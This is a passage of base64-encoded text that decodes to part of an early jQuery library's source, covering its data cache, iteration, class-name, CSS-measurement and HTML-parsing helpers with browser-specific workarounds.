NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CgoJCQlzY3JpcHQudHlwZSA9ICJ0ZXh0L2phdmFzY3JpcHQiOwoJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKQoJCQkJc2NyaXB0LnRleHQgPSBkYXRhOwoJCQllbHNlCgkJCQlzY3JpcHQuYXBwZW5kQ2hpbGQoIGRvY3VtZW50LmNyZWF0ZVRleHROb2RlKCBkYXRhICkgKTsKCgkJCWhlYWQuYXBwZW5kQ2hpbGQoIHNjcmlwdCApOwoJCQloZWFkLnJlbW92ZUNoaWxkKCBzY3JpcHQgKTsKCQl9Cgl9LAoKCW5vZGVOYW1lOiBmdW5jdGlvbiggZWxlbSwgbmFtZSApIHsKCQlyZXR1cm4gZWxlbS5ub2RlTmFtZSAmJiBlbGVtLm5vZGVOYW1lLnRvVXBwZXJDYXNlKCkgPT0gbmFtZS50b1VwcGVyQ2FzZSgpOwoJfSwKCQoJY2FjaGU6IHt9LAoJCglkYXRhOiBmdW5jdGlvbiggZWxlbSwgbmFtZSwgZGF0YSApIHsKCQllbGVtID0gZWxlbSA9PSB3aW5kb3cgPwoJCQl3aW5kb3dEYXRhIDoKCQkJZWxlbTsKCgkJdmFyIGlkID0gZWxlbVsgZXhwYW5kbyBdOwoKCQkvLyBDb21wdXRlIGEgdW5pcXVlIElEIGZvciB0aGUgZWxlbWVudAoJCWlmICggIWlkICkgCgkJCWlkID0gZWxlbVsgZXhwYW5kbyBdID0gKyt1dWlkOwoKCQkvLyBPbmx5IGdlbmVyYXRlIHRoZSBkYXRhIGNhY2hlIGlmIHdlJ3JlCgkJLy8gdHJ5aW5nIHRvIGFjY2VzcyBvciBtYW5pcHVsYXRlIGl0CgkJaWYgKCBuYW1lICYmICFqUXVlcnkuY2FjaGVbIGlkIF0gKQoJCQlqUXVlcnkuY2FjaGVbIGlkIF0gPSB7fTsKCQkKCQkvLyBQcmV2ZW50IG92ZXJyaWRpbmcgdGhlIG5hbWVkIGNhY2hlIHdpdGggdW5kZWZpbmVkIHZhbHVlcwoJCWlmICggZGF0YSAhPSB1bmRlZmluZWQgKQoJCQlqUXVlcnkuY2FjaGVbIGlkIF1bIG5hbWUgXSA9IGRhdGE7CgkJCgkJLy8gUmV0dXJuIHRoZSBuYW1lZCBjYWNoZSBkYXRhLCBvciB0aGUgSUQgZm9yIHRoZSBlbGVtZW50CQoJCXJldHVybiBuYW1lID8KCQkJalF1ZXJ5LmNhY2hlWyBpZCBdWyBuYW1lIF0gOgoJCQlpZDsKCX0sCgkKCXJlbW92ZURhdGE6IGZ1bmN0aW9uKCBlbGVtLCBuYW1lICkgewoJCWVsZW0gPSBlbGVtID09IHdpbmRvdyA/CgkJCXdpbmRvd0RhdGEgOgoJCQllbGVtOwoKCQl2YXIgaWQgPSBlbGVtWyBleHBhbmRvIF07CgoJCS8vIElmIHdlIHdhbnQgdG8gcmVtb3ZlIGEgc3BlY2lmaWMgc2VjdGlvbiBvZiB0aGUgZWxlbWVudCdzIGRhdGEKCQlpZiAoIG5hbWUgKSB7CgkJCWlmICggalF1ZXJ5LmNhY2hlWyBpZCBdICkgewoJCQkJLy8gUmVtb3ZlIHRoZSBzZWN0aW9uIG9mIGNhY2hlIGRhdGEKCQkJCWRlbGV0ZSBqUXVlcnkuY2FjaGVbIGlkIF1bIG5hbWUgXTsKCgkJCQkvLyBJZiB3ZSd2ZSByZW1vdmVkIGFsbCB0aGUgZGF0YSwgcmVtb3ZlIHRoZSBlbGVtZW50J3MgY2FjaGUKCQkJCW5hbWUgPSAiIjsKCgkJCQlmb3IgKCBuYW1lIGluIGpRdWVyeS5jYWNoZVsgaWQgXSApCgkJCQkJYnJlYWs7CgoJCQkJaWYgKCAhbmFtZSApCgkJCQkJalF1ZXJ5LnJlbW92ZURhdGEoIGVsZW0gKTsKCQkJfQoKCQkvLyBPdGhlcndpc2UsIHdlIHdhbnQgdG8gcmVtb3ZlIGFsbCBvZiB0aGUgZWxlbWVudCdzIGRhdGEKCQl9IGVsc2UgewoJCQkvLyBDbGVhbiB1cCB0aGUgZWxlbWVudCBleHBhbmRvCgkJCXRyeSB7CgkJCQlkZWxldGUgZWxlbVsgZXhwYW5kbyBdOwoJCQl9IGNhdGNoKGUpewoJCQkJLy8gSUUgaGFzIHRyb3VibGUgZGlyZWN0bHkgcmVtb3ZpbmcgdGhlIGV4cGFuZG8KCQkJCS8vIGJ1dCBpdCdzIG9rIHdpdGggdXNpbmcgcmVtb3ZlQXR0cmlidXRlCgkJCQlpZiAoIGVsZW0ucmVtb3ZlQXR0cmlidXRlICkKCQkJCQllbGVtLnJlbW92ZUF0dHJpYnV0ZSggZXhwYW5kbyApOwoJCQl9CgoJCQkvLyBDb21wbGV0ZWx5IHJlbW92ZSB0aGUgZGF0YSBjYWNoZQoJCQlkZWxldGUgalF1ZXJ5LmNhY2hlWyBpZCBdOwoJCX0KCX0sCgoJLy8gYXJncyBpcyBmb3IgaW50ZXJuYWwgdXNhZ2Ugb25seQoJZWFjaDogZnVuY3Rpb24oIG9iamVjdCwgY2FsbGJhY2ssIGFyZ3MgKSB7CgkJaWYgKCBhcmdzICkgewoJCQlpZiAoIG9iamVjdC5sZW5ndGggPT0gdW5kZWZpbmVkICkgewoJCQkJZm9yICggdmFyIG5hbWUgaW4gb2JqZWN0ICkKCQkJCQlpZiAoIGNhbGxiYWNrLmFwcGx5KCBvYmplY3RbIG5hbWUgXSwgYXJncyApID09PSBmYWxzZSApCgkJCQkJCWJyZWFrOwoJCQl9IGVsc2UKCQkJCWZvciAoIHZhciBpID0gMCwgbGVuZ3RoID0gb2JqZWN0Lmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJCQlpZiAoIGNhbGxiYWNrLmFwcGx5KCBvYmplY3RbIGkgXSwgYXJncyApID09PSBmYWxzZSApCgkJCQkJCWJyZWFrOwoKCQkvLyBBIHNwZWNpYWwsIGZhc3QsIGNhc2UgZm9yIHRoZSBtb3N0IGNvbW1vbiB1c2Ugb2YgZWFjaAoJCX0gZWxzZSB7CgkJCWlmICggb2JqZWN0Lmxlbmd0aCA9PSB1bmRlZmluZWQgKSB7CgkJCQlmb3IgKCB2YXIgbmFtZSBpbiBvYmplY3QgKQoJCQkJCWlmICggY2FsbGJhY2suY2FsbCggb2JqZWN0WyBuYW1lIF0sIG5hbWUsIG9iamVjdFsgbmFtZSBdICkgPT09IGZhbHNlICkKCQkJCQkJYnJlYWs7CgkJCX0gZWxzZQoJCQkJZm9yICggdmFyIGkgPSAwLCBsZW5ndGggPSBvYmplY3QubGVuZ3RoLCB2YWx1ZSA9IG9iamVjdFswXTsgCgkJCQkJaSA8IGxlbmd0aCAmJiBjYWxsYmFjay5jYWxsKCB2YWx1ZSwgaSwgdmFsdWUgKSAhPT0gZmFsc2U7IHZhbHVlID0gb2JqZWN0WysraV0gKXt9CgkJfQoKCQlyZXR1cm4gb2JqZWN0OwoJfSwKCQoJcHJvcDogZnVuY3Rpb24oIGVsZW0sIHZhbHVlLCB0eXBlLCBpLCBuYW1lICkgewoJCQkvLyBIYW5kbGUgZXhlY3V0YWJsZSBmdW5jdGlvbnMKCQkJaWYgKCBqUXVlcnkuaXNGdW5jdGlvbiggdmFsdWUgKSApCgkJCQl2YWx1ZSA9IHZhbHVlLmNhbGwoIGVsZW0sIGkgKTsKCQkJCQoJCQkvLyBIYW5kbGUgcGFzc2luZyBpbiBhIG51bWJlciB0byBhIENTUyBwcm9wZXJ0eQoJCQlyZXR1cm4gdmFsdWUgJiYgdmFsdWUuY29uc3RydWN0b3IgPT0gTnVtYmVyICYmIHR5cGUgPT0gImN1ckNTUyIgJiYgIWV4Y2x1ZGUudGVzdCggbmFtZSApID8KCQkJCXZhbHVlICsgInB4IiA6CgkJCQl2YWx1ZTsKCX0sCgoJY2xhc3NOYW1lOiB7CgkJLy8gaW50ZXJuYWwgb25seSwgdXNlIGFkZENsYXNzKCJjbGFzcyIpCgkJYWRkOiBmdW5jdGlvbiggZWxlbSwgY2xhc3NOYW1lcyApIHsKCQkJalF1ZXJ5LmVhY2goKGNsYXNzTmFtZXMgfHwgIiIpLnNwbGl0KC9ccysvKSwgZnVuY3Rpb24oaSwgY2xhc3NOYW1lKXsKCQkJCWlmICggZWxlbS5ub2RlVHlwZSA9PSAxICYmICFqUXVlcnkuY2xhc3NOYW1lLmhhcyggZWxlbS5jbGFzc05hbWUsIGNsYXNzTmFtZSApICkKCQkJCQllbGVtLmNsYXNzTmFtZSArPSAoZWxlbS5jbGFzc05hbWUgPyAiICIgOiAiIikgKyBjbGFzc05hbWU7CgkJCX0pOwoJCX0sCgoJCS8vIGludGVybmFsIG9ubHksIHVzZSByZW1vdmVDbGFzcygiY2xhc3MiKQoJCXJlbW92ZTogZnVuY3Rpb24oIGVsZW0sIGNsYXNzTmFtZXMgKSB7CgkJCWlmIChlbGVtLm5vZGVUeXBlID09IDEpCgkJCQllbGVtLmNsYXNzTmFtZSA9IGNsYXNzTmFtZXMgIT0gdW5kZWZpbmVkID8KCQkJCQlqUXVlcnkuZ3JlcChlbGVtLmNsYXNzTmFtZS5zcGxpdCgvXHMrLyksIGZ1bmN0aW9uKGNsYXNzTmFtZSl7CgkJCQkJCXJldHVybiAhalF1ZXJ5LmNsYXNzTmFtZS5oYXMoIGNsYXNzTmFtZXMsIGNsYXNzTmFtZSApOwkKCQkJCQl9KS5qb2luKCIgIikgOgoJCQkJCSIiOwoJCX0sCgoJCS8vIGludGVybmFsIG9ubHksIHVzZSBpcygiLmNsYXNzIikKCQloYXM6IGZ1bmN0aW9uKCBlbGVtLCBjbGFzc05hbWUgKSB7CgkJCXJldHVybiBqUXVlcnkuaW5BcnJheSggY2xhc3NOYW1lLCAoZWxlbS5jbGFzc05hbWUgfHwgZWxlbSkudG9TdHJpbmcoKS5zcGxpdCgvXHMrLykgKSA+IC0xOwoJCX0KCX0sCgoJLy8gQSBtZXRob2QgZm9yIHF1aWNrbHkgc3dhcHBpbmcgaW4vb3V0IENTUyBwcm9wZXJ0aWVzIHRvIGdldCBjb3JyZWN0IGNhbGN1bGF0aW9ucwoJc3dhcDogZnVuY3Rpb24oIGVsZW0sIG9wdGlvbnMsIGNhbGxiYWNrICkgewoJCXZhciBvbGQgPSB7fTsKCQkvLyBSZW1lbWJlciB0aGUgb2xkIHZhbHVlcywgYW5kIGluc2VydCB0aGUgbmV3IG9uZXMKCQlmb3IgKCB2YXIgbmFtZSBpbiBvcHRpb25zICkgewoJCQlvbGRbIG5hbWUgXSA9IGVsZW0uc3R5bGVbIG5hbWUgXTsKCQkJZWxlbS5zdHlsZVsgbmFtZSBdID0gb3B0aW9uc1sgbmFtZSBdOwoJCX0KCgkJY2FsbGJhY2suY2FsbCggZWxlbSApOwoKCQkvLyBSZXZlcnQgdGhlIG9sZCB2YWx1ZXMKCQlmb3IgKCB2YXIgbmFtZSBpbiBvcHRpb25zICkKCQkJZWxlbS5zdHlsZVsgbmFtZSBdID0gb2xkWyBuYW1lIF07Cgl9LAoKCWNzczogZnVuY3Rpb24oIGVsZW0sIG5hbWUsIGZvcmNlICkgewoJCWlmICggbmFtZSA9PSAid2lkdGgiIHx8IG5hbWUgPT0gImhlaWdodCIgKSB7CgkJCXZhciB2YWwsIHByb3BzID0geyBwb3NpdGlvbjogImFic29sdXRlIiwgdmlzaWJpbGl0eTogImhpZGRlbiIsIGRpc3BsYXk6ImJsb2NrIiB9LCB3aGljaCA9IG5hbWUgPT0gIndpZHRoIiA/IFsgIkxlZnQiLCAiUmlnaHQiIF0gOiBbICJUb3AiLCAiQm90dG9tIiBdOwoJCQoJCQlmdW5jdGlvbiBnZXRXSCgpIHsKCQkJCXZhbCA9IG5hbWUgPT0gIndpZHRoIiA/IGVsZW0ub2Zmc2V0V2lkdGggOiBlbGVtLm9mZnNldEhlaWdodDsKCQkJCXZhciBwYWRkaW5nID0gMCwgYm9yZGVyID0gMDsKCQkJCWpRdWVyeS5lYWNoKCB3aGljaCwgZnVuY3Rpb24oKSB7CgkJCQkJcGFkZGluZyArPSBwYXJzZUZsb2F0KGpRdWVyeS5jdXJDU1MoIGVsZW0sICJwYWRkaW5nIiArIHRoaXMsIHRydWUpKSB8fCAwOwoJCQkJCWJvcmRlciArPSBwYXJzZUZsb2F0KGpRdWVyeS5jdXJDU1MoIGVsZW0sICJib3JkZXIiICsgdGhpcyArICJXaWR0aCIsIHRydWUpKSB8fCAwOwoJCQkJfSk7CgkJCQl2YWwgLT0gTWF0aC5yb3VuZChwYWRkaW5nICsgYm9yZGVyKTsKCQkJfQoJCQoJCQlpZiAoIGpRdWVyeShlbGVtKS5pcygiOnZpc2libGUiKSApCgkJCQlnZXRXSCgpOwoJCQllbHNlCgkJCQlqUXVlcnkuc3dhcCggZWxlbSwgcHJvcHMsIGdldFdIICk7CgkJCQoJCQlyZXR1cm4gTWF0aC5tYXgoMCwgdmFsKTsKCQl9CgkJCgkJcmV0dXJuIGpRdWVyeS5jdXJDU1MoIGVsZW0sIG5hbWUsIGZvcmNlICk7Cgl9LAoKCWN1ckNTUzogZnVuY3Rpb24oIGVsZW0sIG5hbWUsIGZvcmNlICkgewoJCXZhciByZXQ7CgoJCS8vIEEgaGVscGVyIG1ldGhvZCBmb3IgZGV0ZXJtaW5pbmcgaWYgYW4gZWxlbWVudCdzIHZhbHVlcyBhcmUgYnJva2VuCgkJZnVuY3Rpb24gY29sb3IoIGVsZW0gKSB7CgkJCWlmICggIWpRdWVyeS5icm93c2VyLnNhZmFyaSApCgkJCQlyZXR1cm4gZmFsc2U7CgoJCQl2YXIgcmV0ID0gZG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSggZWxlbSwgbnVsbCApOwoJCQlyZXR1cm4gIXJldCB8fCByZXQuZ2V0UHJvcGVydHlWYWx1ZSgiY29sb3IiKSA9PSAiIjsKCQl9CgoJCS8vIFdlIG5lZWQgdG8gaGFuZGxlIG9wYWNpdHkgc3BlY2lhbCBpbiBJRQoJCWlmICggbmFtZSA9PSAib3BhY2l0eSIgJiYgalF1ZXJ5LmJyb3dzZXIubXNpZSApIHsKCQkJcmV0ID0galF1ZXJ5LmF0dHIoIGVsZW0uc3R5bGUsICJvcGFjaXR5IiApOwoKCQkJcmV0dXJuIHJldCA9PSAiIiA/CgkJCQkiMSIgOgoJCQkJcmV0OwoJCX0KCQkvLyBPcGVyYSBzb21ldGltZXMgd2lsbCBnaXZlIHRoZSB3cm9uZyBkaXNwbGF5IGFuc3dlciwgdGhpcyBmaXhlcyBpdCwgc2VlICMyMDM3CgkJaWYgKCBqUXVlcnkuYnJvd3Nlci5vcGVyYSAmJiBuYW1lID09ICJkaXNwbGF5IiApIHsKCQkJdmFyIHNhdmUgPSBlbGVtLnN0eWxlLmRpc3BsYXk7CgkJCWVsZW0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CgkJCWVsZW0uc3R5bGUuZGlzcGxheSA9IHNhdmU7CgkJfQoJCQoJCS8vIE1ha2Ugc3VyZSB3ZSdyZSB1c2luZyB0aGUgcmlnaHQgbmFtZSBmb3IgZ2V0dGluZyB0aGUgZmxvYXQgdmFsdWUKCQlpZiAoIG5hbWUubWF0Y2goIC9mbG9hdC9pICkgKQoJCQluYW1lID0gc3R5bGVGbG9hdDsKCgkJaWYgKCAhZm9yY2UgJiYgZWxlbS5zdHlsZSAmJiBlbGVtLnN0eWxlWyBuYW1lIF0gKQoJCQlyZXQgPSBlbGVtLnN0eWxlWyBuYW1lIF07CgoJCWVsc2UgaWYgKCBkb2N1bWVudC5kZWZhdWx0VmlldyAmJiBkb2N1bWVudC5kZWZhdWx0Vmlldy5nZXRDb21wdXRlZFN0eWxlICkgewoKCQkJLy8gT25seSAiZmxvYXQiIGlzIG5lZWRlZCBoZXJlCgkJCWlmICggbmFtZS5tYXRjaCggL2Zsb2F0L2kgKSApCgkJCQluYW1lID0gImZsb2F0IjsKCgkJCW5hbWUgPSBuYW1lLnJlcGxhY2UoIC8oW0EtWl0pL2csICItJDEiICkudG9Mb3dlckNhc2UoKTsKCgkJCXZhciBnZXRDb21wdXRlZFN0eWxlID0gZG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSggZWxlbSwgbnVsbCApOwoKCQkJaWYgKCBnZXRDb21wdXRlZFN0eWxlICYmICFjb2xvciggZWxlbSApICkKCQkJCXJldCA9IGdldENvbXB1dGVkU3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSggbmFtZSApOwoKCQkJLy8gSWYgdGhlIGVsZW1lbnQgaXNuJ3QgcmVwb3J0aW5nIGl0cyB2YWx1ZXMgcHJvcGVybHkgaW4gU2FmYXJpCgkJCS8vIHRoZW4gc29tZSBkaXNwbGF5OiBub25lIGVsZW1lbnRzIGFyZSBpbnZvbHZlZAoJCQllbHNlIHsKCQkJCXZhciBzd2FwID0gW10sIHN0YWNrID0gW107CgoJCQkJLy8gTG9jYXRlIGFsbCBvZiB0aGUgcGFyZW50IGRpc3BsYXk6IG5vbmUgZWxlbWVudHMKCQkJCWZvciAoIHZhciBhID0gZWxlbTsgYSAmJiBjb2xvcihhKTsgYSA9IGEucGFyZW50Tm9kZSApCgkJCQkJc3RhY2sudW5zaGlmdChhKTsKCgkJCQkvLyBHbyB0aHJvdWdoIGFuZCBtYWtlIHRoZW0gdmlzaWJsZSwgYnV0IGluIHJldmVyc2UKCQkJCS8vIChJdCB3b3VsZCBiZSBiZXR0ZXIgaWYgd2Uga25ldyB0aGUgZXhhY3QgZGlzcGxheSB0eXBlIHRoYXQgdGhleSBoYWQpCgkJCQlmb3IgKCB2YXIgaSA9IDA7IGkgPCBzdGFjay5sZW5ndGg7IGkrKyApCgkJCQkJaWYgKCBjb2xvciggc3RhY2tbIGkgXSApICkgewoJCQkJCQlzd2FwWyBpIF0gPSBzdGFja1sgaSBdLnN0eWxlLmRpc3BsYXk7CgkJCQkJCXN0YWNrWyBpIF0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CgkJCQkJfQoKCQkJCS8vIFNpbmNlIHdlIGZsaXAgdGhlIGRpc3BsYXkgc3R5bGUsIHdlIGhhdmUgdG8gaGFuZGxlIHRoYXQKCQkJCS8vIG9uZSBzcGVjaWFsLCBvdGhlcndpc2UgZ2V0IHRoZSB2YWx1ZQoJCQkJcmV0ID0gbmFtZSA9PSAiZGlzcGxheSIgJiYgc3dhcFsgc3RhY2subGVuZ3RoIC0gMSBdICE9IG51bGwgPwoJCQkJCSJub25lIiA6CgkJCQkJKCBnZXRDb21wdXRlZFN0eWxlICYmIGdldENvbXB1dGVkU3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSggbmFtZSApICkgfHwgIiI7CgoJCQkJLy8gRmluYWxseSwgcmV2ZXJ0IHRoZSBkaXNwbGF5IHN0eWxlcyBiYWNrCgkJCQlmb3IgKCB2YXIgaSA9IDA7IGkgPCBzd2FwLmxlbmd0aDsgaSsrICkKCQkJCQlpZiAoIHN3YXBbIGkgXSAhPSBudWxsICkKCQkJCQkJc3RhY2tbIGkgXS5zdHlsZS5kaXNwbGF5ID0gc3dhcFsgaSBdOwoJCQl9CgoJCQkvLyBXZSBzaG91bGQgYWx3YXlzIGdldCBhIG51bWJlciBiYWNrIGZyb20gb3BhY2l0eQoJCQlpZiAoIG5hbWUgPT0gIm9wYWNpdHkiICYmIHJldCA9PSAiIiApCgkJCQlyZXQgPSAiMSI7CgoJCX0gZWxzZSBpZiAoIGVsZW0uY3VycmVudFN0eWxlICkgewoJCQl2YXIgY2FtZWxDYXNlID0gbmFtZS5yZXBsYWNlKC9cLShcdykvZywgZnVuY3Rpb24oYWxsLCBsZXR0ZXIpewoJCQkJcmV0dXJuIGxldHRlci50b1VwcGVyQ2FzZSgpOwoJCQl9KTsKCgkJCXJldCA9IGVsZW0uY3VycmVudFN0eWxlWyBuYW1lIF0gfHwgZWxlbS5jdXJyZW50U3R5bGVbIGNhbWVsQ2FzZSBdOwoKCQkJLy8gRnJvbSB0aGUgYXdlc29tZSBoYWNrIGJ5IERlYW4gRWR3YXJkcwoJCQkvLyBodHRwOi8vZXJpay5lYWUubmV0L2FyY2hpdmVzLzIwMDcvMDcvMjcvMTguNTQuMTUvI2NvbW1lbnQtMTAyMjkxCgoJCQkvLyBJZiB3ZSdyZSBub3QgZGVhbGluZyB3aXRoIGEgcmVndWxhciBwaXhlbCBudW1iZXIKCQkJLy8gYnV0IGEgbnVtYmVyIHRoYXQgaGFzIGEgd2VpcmQgZW5kaW5nLCB3ZSBuZWVkIHRvIGNvbnZlcnQgaXQgdG8gcGl4ZWxzCgkJCWlmICggIS9eXGQrKHB4KT8kL2kudGVzdCggcmV0ICkgJiYgL15cZC8udGVzdCggcmV0ICkgKSB7CgkJCQkvLyBSZW1lbWJlciB0aGUgb3JpZ2luYWwgdmFsdWVzCgkJCQl2YXIgc3R5bGUgPSBlbGVtLnN0eWxlLmxlZnQsIHJ1bnRpbWVTdHlsZSA9IGVsZW0ucnVudGltZVN0eWxlLmxlZnQ7CgoJCQkJLy8gUHV0IGluIHRoZSBuZXcgdmFsdWVzIHRvIGdldCBhIGNvbXB1dGVkIHZhbHVlIG91dAoJCQkJZWxlbS5ydW50aW1lU3R5bGUubGVmdCA9IGVsZW0uY3VycmVudFN0eWxlLmxlZnQ7CgkJCQllbGVtLnN0eWxlLmxlZnQgPSByZXQgfHwgMDsKCQkJCXJldCA9IGVsZW0uc3R5bGUucGl4ZWxMZWZ0ICsgInB4IjsKCgkJCQkvLyBSZXZlcnQgdGhlIGNoYW5nZWQgdmFsdWVzCgkJCQllbGVtLnN0eWxlLmxlZnQgPSBzdHlsZTsKCQkJCWVsZW0ucnVudGltZVN0eWxlLmxlZnQgPSBydW50aW1lU3R5bGU7CgkJCX0KCQl9CgoJCXJldHVybiByZXQ7Cgl9LAoJCgljbGVhbjogZnVuY3Rpb24oIGVsZW1zLCBjb250ZXh0ICkgewoJCXZhciByZXQgPSBbXTsKCQljb250ZXh0ID0gY29udGV4dCB8fCBkb2N1bWVudDsKCQkvLyAhY29udGV4dC5jcmVhdGVFbGVtZW50IGZhaWxzIGluIElFIHdpdGggYW4gZXJyb3IgYnV0IHJldHVybnMgdHlwZW9mICdvYmplY3QnCgkJaWYgKHR5cGVvZiBjb250ZXh0LmNyZWF0ZUVsZW1lbnQgPT0gJ3VuZGVmaW5lZCcpIAoJCQljb250ZXh0ID0gY29udGV4dC5vd25lckRvY3VtZW50IHx8IGNvbnRleHRbMF0gJiYgY29udGV4dFswXS5vd25lckRvY3VtZW50IHx8IGRvY3VtZW50OwoKCQlqUXVlcnkuZWFjaChlbGVtcywgZnVuY3Rpb24oaSwgZWxlbSl7CgkJCWlmICggIWVsZW0gKQoJCQkJcmV0dXJuOwoKCQkJaWYgKCBlbGVtLmNvbnN0cnVjdG9yID09IE51bWJlciApCgkJCQllbGVtID0gZWxlbS50b1N0cmluZygpOwoJCQkKCQkJLy8gQ29udmVydCBodG1sIHN0cmluZyBpbnRvIERPTSBub2RlcwoJCQlpZiAoIHR5cGVvZiBlbGVtID09ICJzdHJpbmciICkgewoJCQkJLy8gRml4ICJYSFRNTCItc3R5bGUgdGFncyBpbiBhbGwgYnJvd3NlcnMKCQkJCWVsZW0gPSBlbGVtLnJlcGxhY2UoLyg8KFx3KylbXj5dKj8pXC8+L2csIGZ1bmN0aW9uKGFsbCwgZnJvbnQsIHRhZyl7CgkJCQkJcmV0dXJuIHRhZy5tYXRjaCgvXihhYmJyfGJyfGNvbHxpbWd8aW5wdXR8bGlua3xtZXRhfHBhcmFtfGhyfGFyZWF8ZW1iZWQpJC9pKSA/CgkJCQkJCWFsbCA6CgkJCQkJCWZyb250ICsgIj48LyIgKyB0YWcgKyAiPiI7CgkJCQl9KTsKCgkJCQkvLyBUcmltIHdoaXRlc3BhY2UsIG90aGVyd2lzZSBpbmRleE9mIHdvbid0IHdvcmsgYXMgZXhwZWN0ZWQKCQkJCXZhciB0YWdzID0galF1ZXJ5LnRyaW0oIGVsZW0gKS50b0xvd2VyQ2FzZSgpLCBkaXYgPSBjb250ZXh0LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwoKCQkJCXZhciB3cmFwID0KCQkJCQkvLyBvcHRpb24gb3Igb3B0Z3JvdXAKCQkJCQkhdGFncy5pbmRleE9mKCI8b3B0IikgJiYKCQkJCQlbIDEsICI8c2VsZWN0IG11bHRpcGxlPSdtdWx0aXBsZSc+IiwgIjwvc2VsZWN0PiIgXSB8fAoJCQkJCQoJCQkJCSF0YWdzLmluZGV4T2YoIjxsZWciKSAmJgoJCQkJCVsgMSwgIjxmaWVsZHNldD4iLCAiPC9maWVsZHNldD4iIF0gfHwKCQkJCQkKCQkJCQl0YWdzLm1hdGNoKC9ePCh0aGVhZHx0Ym9keXx0Zm9vdHxjb2xnfGNhcCkvKSAmJgoJCQkJCVsgMSwgIjx0YWJsZT4iLCAiPC90YWJsZT4iIF0gfHwKCQkJCQkKCQkJCQkhdGFncy5pbmRleE9mKCI8dHIiKSAmJgoJCQkJCVsgMiwgIjx0YWJsZT48dGJvZHk+IiwgIjwvdGJvZHk+PC90YWJsZT4iIF0gfHwKCQkJCQkKCQkJCSAJLy8gPHRoZWFkPiBtYXRjaGVkIGFib3ZlCgkJCQkJKCF0YWdzLmluZGV4T2YoIjx0ZCIpIHx8ICF0YWdzLmluZGV4T2YoIjx0aCIpKSAmJgoJCQkJCVsgMywgIjx0YWJsZT48dGJvZHk+PHRyPiIsICI8L3RyPjwvdGJvZHk+PC90YWJsZT4iIF0gfHwKCQkJCQkKCQkJCQkhdGFncy5pbmRleE9mKCI8Y29sIikgJiYKCQkJCQlbIDIsICI8dGFibGU+PHRib2R5PjwvdGJvZHk+PGNvbGdyb3VwPiIsICI8L2NvbGdyb3VwPjwvdGFibGU+IiBdIHx8CgoJCQkJCS8vIElFIGNhbid0IHNlcmlhbGl6ZSA8bGluaz4gYW5kIDxzY3JpcHQ+IHRhZ3Mgbm9ybWFsbHkKCQkJCQlqUXVlcnkuYnJvd3Nlci5tc2llICYmCgkJCQkJWyAxLCAiZGl2PGRpdj4iLCAiPC9kaXY+IiBdIHx8CgkJCQkJCgkJCQkJWyAwLCAiIiwgIiIgXTsKCgkJCQkvLyBHbyB0byBodG1sIGFuZCBiYWNrLCB0aGVuIHBlZWwgb2ZmIGV4dHJhIHdyYXBwZXJzCgkJCQlkaXYuaW5uZXJIVE1MID0gd3JhcFsxXSArIGVsZW0gKyB3cmFwWzJdOwoJCQkJCgkJCQkvLyBNb3ZlIHRvIHRoZSByaWdodCBkZXB0aAoJCQkJd2hpbGUgKCB3cmFwWzBdLS0gKQoJCQkJCWRpdiA9IGRpdi5sYXN0Q2hpbGQ7CgkJCQkKCQkJCS8vIFJlbW92ZSBJRSdzIGF1dG9pbnNlcnRlZCA8dGJvZHk+IGZyb20gdGFibGUgZnJhZ21lbnRzCgkJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKSB7CgkJCQkJCgkJCQkJLy8gU3RyaW5nIHdhcyBhIDx0YWJsZT4sICptYXkqIGhhdmUgc3B1cmlvdXMgPHRib2R5PgoJCQkJCXZhciB0Ym9keSA9ICF0YWdzLmluZGV4T2YoIjx0YWJsZSIpICYmIHRhZ3MuaW5kZXhPZigiPHRib2R5IikgPCAwID8KCQkJCQkJZGl2LmZpcnN0Q2hpbGQgJiYgZGl2LmZpcnN0Q2hpbGQuY2hpbGROb2RlcyA6CgkJCQkJCQoJCQkJCQkvLyBTdHJpbmcgd2FzIGEgYmFyZSA8dGhlYWQ+IG9yIDx0Zm9vdD4KCQkJCQkJd3JhcFsxXSA9PSAiPHRhYmxlPiIgJiYgdGFncy5pbmRleE9mKCI8dGJvZHkiKSA8IDAgPwoJCQkJCQkJZGl2LmNoaWxkTm9kZXMgOgoJCQkJCQkJW107CgkJCQkKCQkJCQlmb3IgKCB2YXIgaiA9IHRib2R5Lmxlbmd0aCAtIDE7IGogPj0gMCA7IC0taiApCgkJCQkJCWlmICggalF1ZXJ5Lm5vZGVOYW1lKCB0Ym9keVsgaiBdLCAidGJvZHkiICkgJiYgIXRib2R5WyBqIF0uY2hpbGROb2Rlcy5sZW5ndGggKQoJCQkJCQkJdGJvZHlbIGogXS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKCB0Ym9keVsgaiBdICk7CgkJCQkJCgkJCQkJLy8gSUUgY29tcGxldGVseSBraWxscyBsZWFkaW5nIHdoaXRlc3BhY2Ugd2hlbiBpbm5lckhUTUwgaXMgdXNlZAkKCQkJCQlpZiAoIC9eXHMvLnRlc3QoIGVsZW0gKSApCQoJCQkJCQlkaXYuaW5zZXJ0QmVmb3JlKCBjb250ZXh0LmNyZWF0ZVRleHROb2RlKCBlbGVtLm1hdGNoKC9eXHMqLylbMF0gKSwgZGl2LmZpcnN0Q2hpbGQgKTsKCQkJCQoJCQkJfQoJCQkJCgkJCQllbGVtID0galF1ZXJ5Lm1ha2VBcnJheSggZGl2LmNoaWxkTm9kZXMgKTsKCQkJfQoKCQkJaWYgKCBlbGVtLmxlbmd0aCA9PT0gMCAmJiAoIWpRdWVyeS5ub2RlTmFtZSggZWxlbSwgImZvcm0iICkgJiYgIWpRdWVyeS5ub2RlTmFtZSggZWxlbSwgInNlbGVjdCIgKSkgKQoJCQkJcmV0dXJuOwoKCQkJaWYgKCBlbGVtWzBdID09IHVuZGVmaW5lZCB8fCBqUXVlcnkubm9kZU5hbWUoIGVsZW0sICJmb3JtIiApIHx8IGVsZW0ub3B0aW9ucyApCgkJCQlyZXQucHVzaCggZWxlbSA